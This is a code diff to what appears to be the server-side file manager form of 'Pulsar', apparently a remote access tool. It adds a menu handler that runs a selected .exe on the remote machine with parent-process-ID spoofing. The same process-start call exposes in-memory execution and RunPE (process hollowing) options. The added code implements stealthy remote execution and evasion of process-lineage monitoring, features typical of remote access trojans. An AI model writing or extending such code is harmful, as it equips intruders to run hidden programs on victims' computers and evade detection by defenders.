@@ -2581,6 +2581,55 @@ namespace Pulsar.Server.Forms
 
             EnsurePreviewFile(remotePath, localPath, expectedSize);
         }
+
+        private void executePPIDSpoofedToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstDirectory.SelectedIndices.Count == 0)
+                return;
+
+            foreach (int index in lstDirectory.SelectedIndices)
+            {
+                if (index == 0) // skip ".."
+                    continue;
+
+                int cacheIndex = index - 1;
+                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
+                    continue;
+
+                var entry = _cachedItems[cacheIndex];
+                if (entry.EntryType != FileType.File)
+                    continue;
+
+                string remotePath = GetAbsolutePath(entry.Name);
+
+                // === CHECK EXTENSION FIRST ===
+                if (!remotePath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+                {
+                    MessageBox.Show(
+                        "Only .exe files can be executed using PPID spoofing.",
+                        "Invalid File",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Warning);
+
+                    return; // STOP completely
+                }
+
+                // ==== EXECUTE WITH SPECIAL FLAG ====
+                _fileManagerHandler.StartProcess(
+                    remotePath,
+                    isUpdate: false,
+                    executeInMemory: false,
+                    useRunPE: false,
+                    runPETarget: "a",
+                    runPECustomPath: null,
+                    useSpecialExecution: true   // triggers PPID spoofed start
+                );
+
+                SetStatusMessage(this, $"Executing (PPID spoofed): {remotePath}");
+            }
+        }
+
+
         // ------------------------ RedrawScope ------------------------
         internal readonly struct RedrawScope : IDisposable
         {
